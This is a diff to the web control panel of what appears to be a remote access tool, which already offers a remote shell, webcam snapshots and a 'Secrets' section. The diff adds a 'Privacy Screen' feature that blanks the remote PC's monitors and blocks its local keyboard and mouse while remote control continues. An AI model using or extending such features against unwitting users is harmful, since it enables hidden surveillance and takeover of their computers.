@@ -283,6 +283,7 @@ body.light #scr-wrap{background:#e4e4e7}
     <button class="nav-btn" data-p="rshell"><span class="ico">&#x1F5A5;</span><span>Shell</span></button>
     <button class="nav-btn" data-p="webcam2"><span class="ico">&#x1F4F7;</span><span>Webcam Snap</span></button>
     <button class="nav-btn" data-p="winactive"><span class="ico">&#x1FA9F;</span><span>Active Win</span></button>
+    <button class="nav-btn" data-p="privacy"><span class="ico">&#x1F512;</span><span>Privacy Screen</span></button>
   </div>
   <div class="nav-grp">
     <div class="nav-lbl">Secrets</div>
@@ -743,6 +744,27 @@ body.light #scr-wrap{background:#e4e4e7}
         <thead><tr><th>Name</th><th>IP Address</th></tr></thead>
         <tbody id="dns-body"><tr><td colspan="2" style="text-align:center;color:var(--text3);padding:40px">Click Fetch</td></tr></tbody>
       </table>
+    </div>
+  </div>
+
+  <div class="panel" id="privacy">
+    <div class="ph"><h2>&#x1F512; Privacy Screen</h2><span class="meta" id="prv-status-lbl">Unknown</span></div>
+    <div class="pbody" style="padding:20px;display:flex;flex-direction:column;gap:14px;max-width:540px">
+      <div style="background:var(--surface2);border-radius:8px;padding:14px 16px;font-size:.82rem;color:var(--text2);line-height:1.6">
+        Covers all monitors on the remote PC with a full-screen lock overlay.<br>
+        Physical keyboard &amp; mouse are blocked; remote control stays active.<br>
+        Emergency local exit: <b>Ctrl + Alt + Shift + F12</b>
+      </div>
+      <label style="font-size:.82rem;color:var(--text2);font-weight:600">Lock-screen message</label>
+      <textarea id="prv-msg" class="ipt" rows="3" style="resize:vertical;font-family:inherit">Remote support session in progress.
+Please do not touch the computer.</textarea>
+      <label style="font-size:.82rem;color:var(--text2);font-weight:600">PIN to unlock (optional)</label>
+      <input id="prv-pin" class="ipt" type="text" placeholder="Leave blank for no PIN" style="width:200px">
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <button class="act-btn primary" id="prv-start">&#x1F512; Start Privacy Screen</button>
+        <button class="act-btn danger"  id="prv-stop">&#x1F513; Stop Privacy Screen</button>
+      </div>
+      <div id="prv-result" style="font-size:.82rem;color:var(--text3)"></div>
     </div>
   </div>
 
@@ -1285,6 +1307,32 @@ function renderDns(){
   const list=q?_dns.filter(e=>(e.name||"").toLowerCase().includes(q)||(e.ip||"").toLowerCase().includes(q)):_dns;
   $("dns-body").innerHTML=list.map(e=>`<tr><td style="font-family:monospace">${esc(e.name)}</td><td style="font-family:monospace;color:var(--accent2)">${esc(e.ip||"")}</td></tr>`).join("")||'<tr><td colspan="2" style="text-align:center;color:var(--text3);padding:30px">No results</td></tr>';
 }
+
+/* ── Privacy Screen ──────────────────────────────────────── */
+function _prvResult(d){
+  const lbl=$("prv-status-lbl"),res=$("prv-result");
+  if(d.ok){
+    const active=d.running||d.status==="active";
+    lbl.textContent=active?"Active":"Inactive";lbl.style.color=active?"var(--green)":"var(--text3)";
+    res.textContent="Privacy screen "+(active?"started":"stopped")+" — "+(d.message||"");
+  }else{
+    lbl.textContent="Error";lbl.style.color="var(--red)";
+    res.textContent="Error: "+(d.error||d.message||"unknown");
+  }
+}
+$("prv-start").addEventListener("click",()=>{
+  if(!agent)return;
+  const msg=$("prv-msg").value.trim();const pin=$("prv-pin").value.trim();
+  socket.emit("privacy_start",{message:msg||undefined,pin:pin||undefined,_target:agent});
+  $("prv-result").textContent="Starting…";
+});
+$("prv-stop").addEventListener("click",()=>{
+  if(!agent)return;
+  const pin=$("prv-pin").value.trim();
+  socket.emit("privacy_stop",{pin:pin||undefined,_target:agent});
+  $("prv-result").textContent="Stopping…";
+});
+socket.on("privacy_result",d=>{_prvResult(d)});
 
 /* ── Theme toggle ───────────────────────────────────────── */
 (function(){
